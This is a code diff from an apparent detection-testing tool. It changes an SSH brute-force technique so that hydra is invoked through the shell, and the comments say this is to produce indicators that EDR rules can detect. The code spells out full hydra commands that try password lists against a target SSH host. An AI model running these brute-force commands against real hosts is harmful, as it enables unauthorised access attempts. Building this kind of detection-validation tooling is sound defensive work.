@@ -3775,64 +3775,10 @@ impl AttackTechnique for SSHBruteForce {
                 sleep(Duration::from_millis(100)).await;
             }
 
-            // Invoke hydra directly when available so the brute-force tool name
-            // appears in the process tree and argv. The actual attempt list is
-            // intentionally tiny; the goal is the binary fingerprint, not extra
-            // auth-log volume on top of the sshpass loop above.
-            let hydra_check = Command::new("which").arg("hydra").output().await;
-            if let Ok(out) = hydra_check {
-                if out.status.success() {
-                    let user_list = username_rotation.join("\n");
-                    let pass_list = password_attempts.join("\n");
-                    let user_list_path = format!("/tmp/signalbench_users_{session_id}");
-                    let pass_list_path = format!("/tmp/signalbench_passwords_{session_id}");
-
-                    if let Err(e) = tokio::fs::write(&user_list_path, &user_list).await {
-                        warn!("Could not stage hydra user list: {e}");
-                    } else if let Err(e) = tokio::fs::write(&pass_list_path, &pass_list).await {
-                        warn!("Could not stage hydra password list: {e}");
-                    } else {
-                        info!("Invoking hydra against {target_host}:{target_port}");
-                        let hydra_result = Command::new("hydra")
-                            .args([
-                                "-L",
-                                &user_list_path,
-                                "-P",
-                                &pass_list_path,
-                                "-t",
-                                "4",
-                                "-f",
-                                "-o",
-                                &format!("/tmp/signalbench_hydra_{session_id}.out"),
-                                "-s",
-                                &target_port,
-                                &target_host,
-                                "ssh",
-                            ])
-                            .output()
-                            .await;
-                        match hydra_result {
-                            Ok(h) => writeln!(
-                                log,
-                                "hydra exit={} stderr={}",
-                                h.status.code().unwrap_or(-1),
-                                String::from_utf8_lossy(&h.stderr)
-                                    .lines()
-                                    .next()
-                                    .unwrap_or("")
-                            )
-                            .unwrap(),
-                            Err(e) => writeln!(log, "hydra invocation failed: {e}").unwrap(),
-                        }
-                        let _ = tokio::fs::remove_file(&user_list_path).await;
-                        let _ = tokio::fs::remove_file(&pass_list_path).await;
-                        let _ = tokio::fs::remove_file(format!(
-                            "/tmp/signalbench_hydra_{session_id}.out"
-                        ))
-                        .await;
-                    }
-                }
-            }
+            // Hydra is invoked once, below, via the shell (utils::shell_attempt)
+            // so its argv IoC survives even when the binary is absent. The
+            // previous which-gated invocation here was redundant and silently
+            // produced nothing when hydra was missing, so it has been removed.
 
             // Write timing analysis
             writeln!(log, "## Timing Analysis (Potential Timing Attack Data)").unwrap();
@@ -3891,23 +3837,26 @@ impl AttackTechnique for SSHBruteForce {
                 }
             }
 
-            // Execute hydra with visible arguments - highly detectable
-            let hydra_output = Command::new("hydra")
-                .args([
-                    "-l",
-                    &test_username,
-                    "-P",
-                    &password_file,
-                    "-s",
-                    &target_port,
-                    "-t",
-                    "4",
-                    "-f",
-                    "-V",
-                    &format!("ssh://{target_host}"),
-                ])
-                .output()
-                .await;
+            // Execute hydra with visible arguments - highly detectable.
+            // Routed through the shell so the hydra argv (the IoC EDR
+            // brute-force-tool rules match) is still emitted when the binary is
+            // absent — bash spawns and exits 127 rather than ENOENT/no process.
+            let hydra_output = crate::utils::shell_attempt(&[
+                "hydra",
+                "-l",
+                &test_username,
+                "-P",
+                &password_file,
+                "-s",
+                &target_port,
+                "-t",
+                "4",
+                "-f",
+                "-V",
+                &format!("ssh://{target_host}"),
+            ])
+            .output()
+            .await;
 
             match hydra_output {
                 Ok(output) => {
